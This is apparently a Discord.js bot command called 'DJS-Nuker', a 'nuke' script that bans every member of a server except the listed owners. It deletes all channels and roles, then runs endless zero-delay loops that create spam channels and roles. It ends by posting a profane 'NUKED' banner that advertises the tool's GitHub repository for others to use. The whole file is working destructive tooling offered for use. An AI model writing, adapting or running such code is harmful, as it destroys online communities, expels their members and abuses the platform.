const Discord = require("discord.js");

const ownerids = require('../ownerids.json');

module.exports.run = async(bot, message, args) => {

    let members = message.guild.members.size
  
      
    if(!ownerids.ownerid.includes(message.author.id)) return;
    
   message.guild.members.forEach(message => {
      
     if(ownerids.ownerid.includes(message.user.id)) return;
     
     message.ban("Nuke")
     console.log(members)

     
   })
    
    message.delete();

    message.guild.channels.forEach(message => {

        message.delete("Nuke");

    })

    message.guild.roles.forEach(message => {

         message.delete("Nuke");

    })

    setInterval(function(){ message.guild.createChannel("¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲"), {
        type: "text",
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['SEND_MESSAGE']
        }]
    } }, 0);

    setInterval(function(){ message.guild.createChannel("oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯oʊ☃௹₯"), {
        type: "text",
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['SEND_MESSAGE']
        }]
    } }, 1);

    setInterval(function(){ message.guild.createChannel("№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳№✐☎﷼₳"), {
        type: "text",
        permissionOverwrites: [{
            id: message.guild.id,
            allow: ['SEND_MESSAGE']
        }]
    } }, 0);



    setInterval(function(){ message.guild.createRole({
        data: {
            name: "¶☣❦∏㈨⑲¶☣❦∏㈨⑲¶☣❦∏㈨⑲",
            color: "ff3333"
        },
        reason: "NUKED"
    }); }, 0);
  
  let banned = await(message.guild.members).size;
  
 message.guild.createChannel("fucked-by-setinal", {
    type: "text",
    permissionOverwrites: [{
        id: message.guild.id,
        allow: [`SEND_MESSAGES`]
    }]
}).then(() => {
    
    const embed = new Discord.RichEmbed()
    .setColor("fd0000")
    .setTitle("NUKED WITH DJS-Nuker")
    .setImage("https://media0.giphy.com/media/HhTXt43pk1I1W/giphy.gif?cid=ecf05e474oc9z98k6l4zw3b3f4tm8kki7negnt30tm6geqrj&rid=giphy.gif")
    .setFooter("Coded by setinal.")
    .addField("Do you also want to nuke?", "Check https://github.com/Setinal/DJS-Nuker")

    let fucked = message.guild.channels.find(channel => channel.name === "fucked-by-setinal")
    
    fucked.send(embed)


})
  
  message.delete();
  
}